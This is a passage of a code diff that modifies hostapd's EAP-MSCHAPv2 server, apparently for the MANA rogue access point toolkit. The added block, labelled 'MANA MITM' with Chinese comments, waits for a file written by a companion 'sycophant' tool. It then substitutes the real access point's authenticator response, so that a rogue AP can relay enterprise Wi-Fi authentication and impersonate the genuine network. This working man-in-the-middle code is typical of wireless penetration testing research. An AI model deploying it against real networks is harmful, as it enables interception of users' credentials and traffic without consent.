@@ -3940,10 +3940,10 @@ index 4781eb2..9c2d91a 100644
 +}
 +// MANA WPE END
 diff --git a/src/eap_server/eap_server_mschapv2.c b/src/eap_server/eap_server_mschapv2.c
-index f0ba5d0..b2ddb83 100644
+index f0ba5d0..e4d5ed0 100644
 --- a/src/eap_server/eap_server_mschapv2.c
 +++ b/src/eap_server/eap_server_mschapv2.c
-@@ -9,18 +9,18 @@
+@@ -9,18 +9,19 @@
  #include "includes.h"
  
  #include "common.h"
@@ -3953,6 +3953,7 @@ index f0ba5d0..b2ddb83 100644
  #include "eap_i.h"
  #include <stdlib.h>
 -#include "common/mana.h" //MANA
++#include <unistd.h> // for usleep
  
  struct eap_mschapv2_hdr {
 -	u8 op_code; /* MSCHAPV2_OP_* */
@@ -3968,7 +3969,7 @@ index f0ba5d0..b2ddb83 100644
  } STRUCT_PACKED;
  
  #define MSCHAPV2_OP_CHALLENGE 1
-@@ -41,653 +41,709 @@ struct eap_mschapv2_hdr {
+@@ -41,653 +42,754 @@ struct eap_mschapv2_hdr {
  #define PASSWD_CHANGE_CHAL_LEN 16
  #define MSCHAPV2_KEY_LEN 16
  
@@ -4341,6 +4342,51 @@ index f0ba5d0..b2ddb83 100644
 +  ms->mschapv2_id = data->resp_mschapv2_id;
 +  WPA_PUT_BE16(ms->ms_length, ms_len);
 +  msg = (u8 *)(ms + 1);
++
++// === MANA MITM: 尝试使用真实AP的authenticator response ===
++#define MSCHAPV2_AUTH_RESPONSE_LEN 20
++  u8 real_auth_response[MSCHAPV2_AUTH_RESPONSE_LEN];
++  int use_real_response = 0;
++
++  // 等待sycophant生成REAL_AUTH_RESPONSE文件（最多等待10秒）
++  int wait_attempts = 0;
++  int max_wait_attempts = 100; // 100 * 100ms = 10秒
++  FILE *fp = NULL;
++
++  wpa_printf(MSG_INFO,
++             "=== MANA MITM: Waiting for real AP response from sycophant...");
++
++  while (wait_attempts < max_wait_attempts && !use_real_response) {
++    fp = fopen("/tmp/REAL_AUTH_RESPONSE", "rb");
++    if (fp) {
++      if (fread(real_auth_response, 1, MSCHAPV2_AUTH_RESPONSE_LEN, fp) ==
++          MSCHAPV2_AUTH_RESPONSE_LEN) {
++        use_real_response = 1;
++        wpa_printf(MSG_INFO,
++                   "=== MANA MITM: Using REAL AP's authenticator response "
++                   "(waited %d ms) ===",
++                   wait_attempts * 100);
++        wpa_hexdump(MSG_INFO, "Real AP Auth Response", real_auth_response,
++                    MSCHAPV2_AUTH_RESPONSE_LEN);
++
++        // 复制真实响应到data->auth_response，这样后续代码可以正常使用
++        os_memcpy(data->auth_response, real_auth_response,
++                  MSCHAPV2_AUTH_RESPONSE_LEN);
++      }
++      fclose(fp);
++    }
++
++    if (!use_real_response) {
++      usleep(100000); // 等待100ms
++      wait_attempts++;
++    }
++  }
++
++  if (!use_real_response) {
++    wpa_printf(
++        MSG_INFO,
++        "=== MANA MITM: No real response found, using self-calculated ===");
++  }
 +
 +  wpabuf_put_u8(req, 'S');
 +  wpabuf_put_u8(req, '=');
